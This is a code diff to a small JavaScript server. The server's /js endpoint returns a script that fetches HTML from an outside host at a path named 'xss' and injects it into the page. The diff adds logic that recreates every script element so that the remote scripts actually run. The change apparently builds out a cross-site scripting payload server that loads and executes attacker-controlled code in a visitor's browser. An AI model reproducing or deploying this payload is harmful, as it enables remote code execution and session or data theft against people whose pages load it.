@@ -23,7 +23,32 @@ serve({
     }
 
     if (url.pathname === "/js" && req.method === "GET") {
-      const jsCode = "console.log('Evaluating JS string');fetch('https://data.estebanmf.space/xss').then(t=>t.text()).then(d=>{console.log('Fetched HTML:', d);document.body.innerHTML=d}).catch(e=>console.error('Fetch error:', e));";
+      const jsCode = `
+console.log('Evaluating JS string');
+fetch('https://data.estebanmf.space/xss')
+.then(t => t.text())
+.then(d => {
+console.log('Fetched HTML:', d);
+document.body.innerHTML = d;
+// Force execute all scripts by replacing them with new elements
+const scripts = document.querySelectorAll('script');
+scripts.forEach(oldScript => {
+const newScript = document.createElement('script');
+if (oldScript.src) {
+newScript.src = oldScript.src;
+} else {
+newScript.textContent = oldScript.innerHTML;
+}
+// Add any attributes if needed (e.g., type, async)
+Array.from(oldScript.attributes).forEach(attr => {
+if (attr.name !== 'src') newScript.setAttribute(attr.name, attr.value);
+});
+oldScript.parentNode.replaceChild(newScript, oldScript);
+console.log('Executed script:', newScript.textContent.substring(0, 50) + '...'); // Debug log
+});
+})
+.catch(e => console.error('Fetch error:', e));
+`;
       return new Response(jsCode, {
         headers: {
           "Content-Type": "application/javascript",
